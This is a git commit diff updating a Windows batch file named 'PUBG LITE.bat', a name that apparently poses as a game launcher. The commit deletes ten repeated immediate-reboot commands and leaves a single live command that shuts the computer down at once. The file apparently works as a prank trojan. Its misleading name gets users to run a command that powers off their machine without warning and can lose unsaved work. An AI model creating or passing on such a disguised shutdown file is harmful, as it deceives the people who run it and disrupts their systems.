c466894318b19f75765260d59e3a10b4ed4b0c8e
Hack4peace <85699568+hack4peace@users.noreply.github.com>
2021-07-05 12:33:49 +0530

    Update PUBG LITE.bat

--- PUBG LITE.bat
+++ PUBG LITE.bat
@@ -1,11 +1,1 @@
-shutdown -r now
-shutdown -r now
-shutdown -r now 
-shutdown -r now 
-shutdown -r now 
-shutdown -r now
-shutdown -r now
-shutdown -r now
-shutdown -r now
-shutdown -r now
 shutdown -s now
